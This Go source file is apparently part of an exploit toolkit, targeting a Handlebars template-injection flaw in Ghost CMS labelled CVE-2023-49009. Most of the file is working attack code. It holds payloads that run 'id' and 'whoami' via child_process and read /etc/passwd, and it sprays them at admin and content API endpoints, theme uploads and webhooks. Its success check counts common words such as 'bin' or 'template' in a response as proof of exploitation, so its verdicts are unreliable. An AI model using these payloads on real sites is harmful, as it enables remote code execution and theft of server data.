package exploits

import (
	"fmt"
	"strings"
	"time"

	"github.com/go-resty/resty/v2"
)

// CVE202349009Exploit represents the CVE-2023-49009 exploit
type CVE202349009Exploit struct {
	client  *resty.Client
	target  string
	timeout time.Duration
}

// CVE202349009Result represents the result of CVE-2023-49009 exploitation
type CVE202349009Result struct {
	Vulnerable    bool     `json:"vulnerable"`
	Exploitable   bool     `json:"exploitable"`
	Payloads      []string `json:"payloads"`
	Responses     []string `json:"responses"`
	ErrorMessages []string `json:"error_messages"`
	Severity      string   `json:"severity"`
	Description   string   `json:"description"`
	Remediation   string   `json:"remediation"`
}

// NewCVE202349009Exploit creates a new CVE-2023-49009 exploit instance
func NewCVE202349009Exploit(target string, timeout time.Duration) *CVE202349009Exploit {
	client := resty.New()
	client.SetTimeout(timeout)
	client.SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	client.SetRedirectPolicy(resty.FlexibleRedirectPolicy(5))

	return &CVE202349009Exploit{
		client:  client,
		target:  strings.TrimSuffix(target, "/"),
		timeout: timeout,
	}
}

// Exploit attempts to exploit CVE-2023-49009 (Template Injection)
func (e *CVE202349009Exploit) Exploit() (*CVE202349009Result, error) {
	result := &CVE202349009Result{
		Severity:    "Critical",
		Description: "CVE-2023-49009: Server-side template injection vulnerability in Ghost CMS allowing remote code execution",
		Remediation: "Update Ghost to version 5.73.2 or later",
		Payloads:    []string{},
		Responses:   []string{},
	}

	// Template injection payloads for Ghost CMS (Handlebars)
	payloads := []string{
		// Basic Handlebars injection
		"{{7*7}}",
		"{{this}}",
		"{{constructor}}",
		"{{constructor.constructor}}",
		
		// Process object access
		"{{#with this}}{{#with constructor}}{{#with constructor}}{{process}}{{/with}}{{/with}}{{/with}}",
		"{{#with this}}{{#with constructor}}{{#with constructor}}{{process.env}}{{/with}}{{/with}}{{/with}}",
		
		// Command execution attempts
		"{{#with this}}{{#with constructor}}{{#with constructor}}{{process.mainModule.require('child_process').exec('id')}}{{/with}}{{/with}}{{/with}}",
		"{{#with this}}{{#with constructor}}{{#with constructor}}{{process.mainModule.require('child_process').execSync('whoami')}}{{/with}}{{/with}}{{/with}}",
		"{{#with this}}{{#with constructor}}{{#with constructor}}{{process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}}{{/with}}{{/with}}{{/with}}",
		
		// Alternative syntax
		"{{#with (this.constructor.constructor 'return process')()}}{{this.env}}{{/with}}",
		"{{#with (this.constructor.constructor 'return global.process')()}}{{this.mainModule.require('child_process').execSync('id')}}{{/with}}",
		
		// Ghost-specific template injection
		"{{@site.title}}{{7*7}}",
		"{{@config}}{{constructor}}",
		"{{@labs}}{{this.constructor}}",
		
		// URL encoded payloads
		"%7B%7B7*7%7D%7D",
		"%7B%7Bthis%7D%7D",
		"%7B%7Bconstructor%7D%7D",
		
		// Double encoded
		"%257B%257B7*7%257D%257D",
		
		// With different contexts
		"{{#each this}}{{constructor}}{{/each}}",
		"{{#if this}}{{constructor}}{{/if}}",
		"{{#unless this}}{{constructor}}{{/unless}}",
	}

	// Test various endpoints that might process templates
	endpoints := []string{
		"/ghost/api/v4/admin/posts/",
		"/ghost/api/v4/admin/pages/",
		"/ghost/api/v4/admin/themes/",
		"/ghost/api/v4/admin/settings/",
		"/ghost/api/v4/admin/users/",
		"/ghost/api/v4/admin/tags/",
		"/ghost/api/v4/admin/webhooks/",
		"/ghost/api/v4/admin/integrations/",
		"/ghost/api/v4/admin/invites/",
		"/ghost/api/v4/admin/notifications/",
		"/ghost/api/v4/content/posts/",
		"/ghost/api/v4/content/pages/",
		"/ghost/api/v4/content/tags/",
		"/ghost/api/v4/content/authors/",
		"/ghost/api/v4/content/settings/",
	}

	// Test GET requests with template injection in parameters
	for _, endpoint := range endpoints {
		for _, payload := range payloads {
			// Test in query parameters
			testURL := fmt.Sprintf("%s%s?filter=%s", e.target, endpoint, payload)
			result.Payloads = append(result.Payloads, testURL)

			resp, err := e.client.R().Get(testURL)
			if err != nil {
				result.ErrorMessages = append(result.ErrorMessages, err.Error())
				continue
			}

			responseBody := resp.String()
			result.Responses = append(result.Responses, fmt.Sprintf("GET Status: %d, Body: %s", resp.StatusCode(), responseBody[:min(200, len(responseBody))]))

			if e.isTemplateInjectionSuccessful(payload, responseBody) {
				result.Vulnerable = true
				result.Exploitable = true
				return result, nil
			}
		}
	}

	// Test POST requests with template injection in body
	result = e.testPostTemplateInjection(result, payloads)

	// Test theme upload with template injection
	result = e.testThemeTemplateInjection(result, payloads)

	// Test webhook template injection
	result = e.testWebhookTemplateInjection(result, payloads)

	return result, nil
}

// isTemplateInjectionSuccessful checks if the response indicates successful template injection
func (e *CVE202349009Exploit) isTemplateInjectionSuccessful(payload, body string) bool {
	// Check for mathematical evaluation (7*7 = 49)
	if strings.Contains(payload, "7*7") && strings.Contains(body, "49") {
		return true
	}

	// Check for object exposure
	if strings.Contains(payload, "constructor") && (strings.Contains(body, "function") || strings.Contains(body, "[object") || strings.Contains(body, "Object")) {
		return true
	}

	// Check for process object exposure
	if strings.Contains(payload, "process") && (strings.Contains(body, "env") || strings.Contains(body, "argv") || strings.Contains(body, "pid")) {
		return true
	}

	// Check for command execution results
	commandResults := []string{
		"uid=",     // id command output
		"gid=",     // id command output
		"root",     // whoami output
		"daemon",   // /etc/passwd content
		"bin",      // /etc/passwd content
	}

	body = strings.ToLower(body)
	for _, result := range commandResults {
		if strings.Contains(body, strings.ToLower(result)) {
			return true
		}
	}

	// Check for error messages that indicate template processing
	errorIndicators := []string{
		"handlebars",
		"template",
		"syntax error",
		"unexpected token",
		"cannot read property",
		"reference error",
	}

	for _, indicator := range errorIndicators {
		if strings.Contains(body, strings.ToLower(indicator)) {
			return true
		}
	}

	return false
}

// testPostTemplateInjection tests POST endpoints for template injection
func (e *CVE202349009Exploit) testPostTemplateInjection(result *CVE202349009Result, payloads []string) *CVE202349009Result {
	postEndpoints := []string{
		"/ghost/api/v4/admin/posts/",
		"/ghost/api/v4/admin/pages/",
		"/ghost/api/v4/admin/tags/",
		"/ghost/api/v4/admin/webhooks/",
	}

	for _, endpoint := range postEndpoints {
		for _, payload := range payloads {
			testURL := fmt.Sprintf("%s%s", e.target, endpoint)
			result.Payloads = append(result.Payloads, fmt.Sprintf("POST %s with payload: %s", testURL, payload))

			// Test in different JSON fields
			jsonPayloads := []string{
				fmt.Sprintf(`{"title":"%s"}`, payload),
				fmt.Sprintf(`{"content":"%s"}`, payload),
				fmt.Sprintf(`{"excerpt":"%s"}`, payload),
				fmt.Sprintf(`{"meta_title":"%s"}`, payload),
				fmt.Sprintf(`{"meta_description":"%s"}`, payload),
				fmt.Sprintf(`{"name":"%s"}`, payload),
				fmt.Sprintf(`{"description":"%s"}`, payload),
				fmt.Sprintf(`{"target_url":"%s"}`, payload),
			}

			for _, jsonPayload := range jsonPayloads {
				resp, err := e.client.R().
					SetHeader("Content-Type", "application/json").
					SetBody(jsonPayload).
					Post(testURL)

				if err != nil {
					result.ErrorMessages = append(result.ErrorMessages, err.Error())
					continue
				}

				responseBody := resp.String()
				result.Responses = append(result.Responses, fmt.Sprintf("POST Status: %d, Body: %s", resp.StatusCode(), responseBody[:min(200, len(responseBody))]))

				if e.isTemplateInjectionSuccessful(payload, responseBody) {
					result.Vulnerable = true
					result.Exploitable = true
					return result
				}
			}
		}
	}

	return result
}

// testThemeTemplateInjection tests theme upload for template injection
func (e *CVE202349009Exploit) testThemeTemplateInjection(result *CVE202349009Result, payloads []string) *CVE202349009Result {
	themeEndpoint := fmt.Sprintf("%s/ghost/api/v4/admin/themes/upload/", e.target)

	for _, payload := range payloads {
		result.Payloads = append(result.Payloads, fmt.Sprintf("Theme upload with payload: %s", payload))

		// Create a malicious theme with template injection
		maliciousTheme := fmt.Sprintf(`{
			"name": "malicious-theme",
			"version": "1.0.0",
			"description": "%s",
			"engines": {
				"ghost": ">=4.0.0"
			},
			"config": {
				"custom": "%s"
			}
		}`, payload, payload)

		resp, err := e.client.R().
			SetFormData(map[string]string{
				"theme": maliciousTheme,
			}).
			Post(themeEndpoint)

		if err != nil {
			result.ErrorMessages = append(result.ErrorMessages, err.Error())
			continue
		}

		responseBody := resp.String()
		result.Responses = append(result.Responses, fmt.Sprintf("Theme Upload Status: %d, Body: %s", resp.StatusCode(), responseBody[:min(200, len(responseBody))]))

		if e.isTemplateInjectionSuccessful(payload, responseBody) {
			result.Vulnerable = true
			result.Exploitable = true
			return result
		}
	}

	return result
}

// testWebhookTemplateInjection tests webhook creation for template injection
func (e *CVE202349009Exploit) testWebhookTemplateInjection(result *CVE202349009Result, payloads []string) *CVE202349009Result {
	webhookEndpoint := fmt.Sprintf("%s/ghost/api/v4/admin/webhooks/", e.target)

	for _, payload := range payloads {
		result.Payloads = append(result.Payloads, fmt.Sprintf("Webhook creation with payload: %s", payload))

		// Create webhook with template injection in various fields
		webhookPayload := fmt.Sprintf(`{
			"webhooks": [{
				"event": "post.published",
				"target_url": "https://example.com/webhook",
				"name": "%s",
				"secret": "%s",
				"api_version": "v4"
			}]
		}`, payload, payload)

		resp, err := e.client.R().
			SetHeader("Content-Type", "application/json").
			SetBody(webhookPayload).
			Post(webhookEndpoint)

		if err != nil {
			result.ErrorMessages = append(result.ErrorMessages, err.Error())
			continue
		}

		responseBody := resp.String()
		result.Responses = append(result.Responses, fmt.Sprintf("Webhook Status: %d, Body: %s", resp.StatusCode(), responseBody[:min(200, len(responseBody))]))

		if e.isTemplateInjectionSuccessful(payload, responseBody) {
			result.Vulnerable = true
			result.Exploitable = true
			return result
		}
	}

	return result
}

// GetCVEInfo returns information about CVE-2023-49009
func (e *CVE202349009Exploit) GetCVEInfo() map[string]interface{} {
	return map[string]interface{}{
		"cve_id":      "CVE-2023-49009",
		"severity":    "Critical",
		"cvss_score":  9.8,
		"description": "Server-side template injection vulnerability in Ghost CMS allowing remote code execution through Handlebars template processing",
		"affected_versions": []string{
			"< 5.73.2",
		},
		"remediation": "Update Ghost to version 5.73.2 or later",
		"references": []string{
			"https://github.com/TryGhost/Ghost/security/advisories/GHSA-wfrj-qqc2-83cm",
			"https://nvd.nist.gov/vuln/detail/CVE-2023-49009",
		},
		"attack_vector": "Network",
		"complexity":   "Low",
		"impact": map[string]string{
			"confidentiality": "High",
			"integrity":       "High",
			"availability":    "High",
		},
	}
}